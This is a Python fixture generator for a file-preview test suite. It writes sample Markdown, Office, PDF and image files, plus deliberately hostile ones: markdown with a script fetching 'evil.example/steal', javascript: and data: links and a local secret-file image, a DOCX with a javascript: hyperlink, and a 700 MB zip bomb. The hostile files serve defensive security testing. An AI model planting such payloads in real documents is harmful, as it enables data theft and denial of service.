#!/usr/bin/env python3
"""Generate deterministic test fixtures for the preview test suite.

Pure standard library (zipfile, struct, zlib) so it runs on any CI image
without extra packages. Writes into test/fixtures/ next to this script.
"""
import os
import struct
import zipfile
import zlib

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "fixtures")
os.makedirs(OUT, exist_ok=True)


def write(name, data):
    mode = "wb" if isinstance(data, (bytes, bytearray)) else "w"
    with open(os.path.join(OUT, name), mode) as f:
        f.write(data)


# --- a tiny 2x2 PNG (red/blue checker) --------------------------------------
def tiny_png():
    def chunk(tag, payload):
        c = struct.pack(">I", len(payload)) + tag + payload
        return c + struct.pack(">I", zlib.crc32(tag + payload) & 0xFFFFFFFF)

    ihdr = chunk(b"IHDR", struct.pack(">IIBBBBB", 2, 2, 8, 2, 0, 0, 0))
    raw = b"\x00\xff\x00\x00\xff\x00\x00" + b"\x00\x00\x00\xff\x00\x00\xff"
    idat = chunk(b"IDAT", zlib.compress(raw))
    return b"\x89PNG\r\n\x1a\n" + ihdr + idat + chunk(b"IEND", b"")


PNG = tiny_png()
write("pix.png", PNG)

# --- plain text family ------------------------------------------------------
write("doc.md", """# Test Document

Some **bold**, *italic*, `inline code`, and a [link](https://example.com).

![local image](pix.png)

## Code

```c
int main(void) { return 0; }
```

| Col A | Col B |
|-------|-------|
| 1     | two   |

- [x] done thing
- [ ] pending thing
""")

write("data.json", '{"user":{"name":"ann","tags":["x","y"],"meta":{},"n":3.14,"ok":true}}')
write("table.csv", 'name,qty,"note, with comma"\nwidget,3,"says ""hi"" ok"\ngadget,12,plain\n')
write("table.tsv", "a\tb\tc\n1\t2\t3\n")
write("sample.c", '#include <stdio.h>\nint main(void){printf("hi\\n");return 0;}\n')
write("blob.bin", bytes(range(256)) * 4)

# --- hostile markdown (security assertions) ---------------------------------
write("secret.txt", "TOP SECRET sentinel value 8f3a2b\n")
write("evil.md", """# Doc

<script>fetch('https://evil.example/steal')</script>

[click](javascript:alert(1))
[mixed](jAvAsCrIpT:alert(2))
[data](data:text/html,<script>x</script>)
[fine](https://example.com/ok)
[relative](docs/page.md)

![steal](secret.txt)
![legit](pix.png)
""")

# --- OOXML helpers ----------------------------------------------------------
NS_W = ('xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" '
        'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" '
        'xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" '
        'xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" '
        'xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture"')


def docx():
    def hp(lvl, t):
        return (f'<w:p><w:pPr><w:pStyle w:val="Heading{lvl}"/></w:pPr>'
                f'<w:r><w:t>{t}</w:t></w:r></w:p>')

    def li(num, ilvl, t):
        return (f'<w:p><w:pPr><w:numPr><w:ilvl w:val="{ilvl}"/>'
                f'<w:numId w:val="{num}"/></w:numPr></w:pPr>'
                f'<w:r><w:t>{t}</w:t></w:r></w:p>')

    body = (
        hp(1, "Quarterly Report")
        + '<w:p><w:r><w:t>Plain paragraph text.</w:t></w:r></w:p>'
        + '<w:p><w:r><w:rPr><w:b/></w:rPr><w:t>Bold</w:t></w:r>'
          '<w:r><w:t xml:space="preserve"> and </w:t></w:r>'
          '<w:r><w:rPr><w:i/></w:rPr><w:t>italic</w:t></w:r>'
          '<w:r><w:t xml:space="preserve"> and </w:t></w:r>'
          '<w:r><w:rPr><w:color w:val="C00000"/></w:rPr><w:t>red</w:t></w:r>'
          '<w:r><w:t xml:space="preserve"> and x</w:t></w:r>'
          '<w:r><w:rPr><w:vertAlign w:val="superscript"/></w:rPr><w:t>2</w:t></w:r>'
          '<w:r><w:t>.</w:t></w:r></w:p>'
        + hp(2, "Lists")
        + li(1, 0, "bullet one") + li(1, 0, "bullet two") + li(1, 1, "nested bullet")
        + li(2, 0, "first") + li(2, 0, "second")
        + hp(2, "Table")
        + '<w:tbl><w:tr><w:tc><w:tcPr><w:gridSpan w:val="2"/></w:tcPr>'
          '<w:p><w:r><w:rPr><w:b/></w:rPr><w:t>Spanning header</w:t></w:r></w:p></w:tc></w:tr>'
          '<w:tr><w:tc><w:p><w:r><w:t>cell A</w:t></w:r></w:p></w:tc>'
          '<w:tc><w:p><w:r><w:t>cell B</w:t></w:r></w:p></w:tc></w:tr></w:tbl>'
        + hp(2, "Link and image")
        + '<w:p><w:hyperlink r:id="rId5"><w:r><w:t>a link</w:t></w:r></w:hyperlink></w:p>'
        + '<w:p><w:hyperlink r:id="rId6"><w:r><w:t>bad link</w:t></w:r></w:hyperlink></w:p>'
        + '<w:p><w:r><w:drawing><wp:inline><wp:extent cx="952500" cy="952500"/>'
          '<a:graphic><a:graphicData><pic:pic><pic:blipFill>'
          '<a:blip r:embed="rId9"/></pic:blipFill></pic:pic></a:graphicData></a:graphic>'
          '</wp:inline></w:drawing></w:r></w:p>'
    )
    doc = f'<?xml version="1.0"?><w:document {NS_W}><w:body>{body}</w:body></w:document>'
    rels = ('<?xml version="1.0"?><Relationships '
            'xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com/x" TargetMode="External"/>'
            '<Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:alert(1)" TargetMode="External"/>'
            '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.png"/>'
            '</Relationships>')
    numbering = ('<?xml version="1.0"?><w:numbering '
                 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
                 '<w:abstractNum w:abstractNumId="0"><w:lvl w:ilvl="0"><w:numFmt w:val="bullet"/></w:lvl>'
                 '<w:lvl w:ilvl="1"><w:numFmt w:val="bullet"/></w:lvl></w:abstractNum>'
                 '<w:abstractNum w:abstractNumId="1"><w:lvl w:ilvl="0"><w:numFmt w:val="decimal"/></w:lvl></w:abstractNum>'
                 '<w:num w:numId="1"><w:abstractNumId w:val="0"/></w:num>'
                 '<w:num w:numId="2"><w:abstractNumId w:val="1"/></w:num></w:numbering>')
    ct = ('<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
          '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
          '<Default Extension="xml" ContentType="application/xml"/>'
          '<Default Extension="png" ContentType="image/png"/>'
          '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>')
    rr = ('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
          '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>')
    with zipfile.ZipFile(os.path.join(OUT, "report.docx"), "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", ct)
        z.writestr("_rels/.rels", rr)
        z.writestr("word/document.xml", doc)
        z.writestr("word/_rels/document.xml.rels", rels)
        z.writestr("word/numbering.xml", numbering)
        z.writestr("word/media/image1.png", PNG)


def xlsx():
    ct = ('<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
          '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
          '<Default Extension="xml" ContentType="application/xml"/>'
          '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/></Types>')
    rr = ('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
          '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>')
    wb = ('<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
          'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
          '<sheets><sheet name="Revenue" sheetId="1" r:id="rId1"/>'
          '<sheet name="Notes &amp; Caveats" sheetId="2" r:id="rId2"/></sheets></workbook>')
    wbr = ('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
           '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>'
           '<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet2.xml"/></Relationships>')
    ss = ('<?xml version="1.0"?><sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="2" uniqueCount="2">'
          '<si><t>Product</t></si><si><t>Date</t></si></sst>')
    # styles: cell format index 1 uses builtin date numFmt 14
    styles = ('<?xml version="1.0"?><styleSheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
              '<cellXfs count="2"><xf numFmtId="0"/><xf numFmtId="14" applyNumberFormat="1"/></cellXfs></styleSheet>')
    # A2 = 45658 which is 2025-01-01 as an Excel serial date, styled with s="1"
    s1 = ('<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>'
          '<row r="1"><c r="A1" t="s"><v>0</v></c><c r="B1" t="s"><v>1</v></c></row>'
          '<row r="2"><c r="A2"><v>1234.5</v></c><c r="B2" s="1"><v>45658</v></c><c r="D2" t="b"><v>1</v></c></row>'
          '</sheetData></worksheet>')
    s2 = ('<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>'
          '<row r="1"><c r="A1" t="inlineStr"><is><t>inline text</t></is></c></row></sheetData></worksheet>')
    with zipfile.ZipFile(os.path.join(OUT, "sheet.xlsx"), "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", ct)
        z.writestr("_rels/.rels", rr)
        z.writestr("xl/workbook.xml", wb)
        z.writestr("xl/_rels/workbook.xml.rels", wbr)
        z.writestr("xl/sharedStrings.xml", ss)
        z.writestr("xl/styles.xml", styles)
        z.writestr("xl/worksheets/sheet1.xml", s1)
        z.writestr("xl/worksheets/sheet2.xml", s2)


def pptx():
    def slide(title, lines):
        ps = "".join(f'<a:p><a:r><a:t>{l}</a:t></a:r></a:p>' for l in lines)
        return (f'<?xml version="1.0"?><p:sld '
                'xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" '
                'xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" '
                'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
                '<p:cSld><p:spTree>'
                '<p:sp><p:nvSpPr><p:nvPr><p:ph type="title"/></p:nvPr></p:nvSpPr>'
                f'<p:txBody><a:p><a:r><a:t>{title}</a:t></a:r></a:p></p:txBody></p:sp>'
                f'<p:sp><p:nvSpPr><p:nvPr><p:ph type="body"/></p:nvPr></p:nvSpPr><p:txBody>{ps}</p:txBody></p:sp>'
                '<p:pic><p:blipFill><a:blip r:embed="rId2"/></p:blipFill></p:pic>'
                '</p:spTree></p:cSld></p:sld>')

    ctp = ('<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
           '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
           '<Default Extension="xml" ContentType="application/xml"/>'
           '<Default Extension="png" ContentType="image/png"/>'
           '<Override PartName="/ppt/presentation.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml"/></Types>')
    rrp = ('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
           '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="ppt/presentation.xml"/></Relationships>')
    srel = ('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image1.png"/></Relationships>')
    with zipfile.ZipFile(os.path.join(OUT, "deck.pptx"), "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", ctp)
        z.writestr("_rels/.rels", rrp)
        z.writestr("ppt/presentation.xml",
                   '<?xml version="1.0"?><p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"/>')
        z.writestr("ppt/slides/slide1.xml", slide("First Slide", ["point one", "point two"]))
        z.writestr("ppt/slides/slide2.xml", slide("Second Slide", ["only point"]))
        z.writestr("ppt/slides/_rels/slide1.xml.rels", srel)
        z.writestr("ppt/slides/_rels/slide2.xml.rels", srel)
        z.writestr("ppt/media/image1.png", PNG)


def pdf():
    pages = 3
    objs = ["<< /Type /Catalog /Pages 2 0 R >>"]
    kids = " ".join(f"{3 + i * 2} 0 R" for i in range(pages))
    objs.append(f"<< /Type /Pages /Kids [{kids}] /Count {pages} >>")
    for i in range(pages):
        objs.append(f"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
                    f"/Contents {4 + i * 2} 0 R /Resources << /Font << /F1 {3 + pages * 2} 0 R >> >> >>")
        text = f"BT /F1 36 Tf 72 700 Td (Page {i + 1} of {pages}) Tj ET"
        objs.append(f"<< /Length {len(text)} >>\nstream\n{text}\nendstream")
    objs.append("<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>")
    out = "%PDF-1.4\n"
    offs = []
    for i, o in enumerate(objs):
        offs.append(len(out))
        out += f"{i + 1} 0 obj\n{o}\nendobj\n"
    xref = len(out)
    out += f"xref\n0 {len(objs) + 1}\n0000000000 65535 f \n"
    for o in offs:
        out += f"{o:010d} 00000 n \n"
    out += f"trailer\n<< /Size {len(objs) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF"
    write("three.pdf", out)


# --- corrupt / adversarial --------------------------------------------------
def zip_bomb():
    ct = ('<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
          '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
          '<Default Extension="xml" ContentType="application/xml"/>'
          '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>')
    rr = ('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
          '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>')
    with zipfile.ZipFile(os.path.join(OUT, "bomb.docx"), "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", ct)
        z.writestr("_rels/.rels", rr)
        z.writestr("word/document.xml",
                   f'<?xml version="1.0"?><w:document {NS_W}><w:body>'
                   '<w:p><w:r><w:t>survived</w:t></w:r></w:p></w:body></w:document>')
        z.writestr("word/numbering.xml", b"\x00" * (700 * 1024 * 1024))


docx()
xlsx()
pptx()
pdf()
zip_bomb()
write("corrupt.pdf", "%PDF-1.4 this is not a real pdf")
write("bad.docx", b"PK\x03\x04 not actually a zip archive")

print(f"fixtures written to {OUT}")
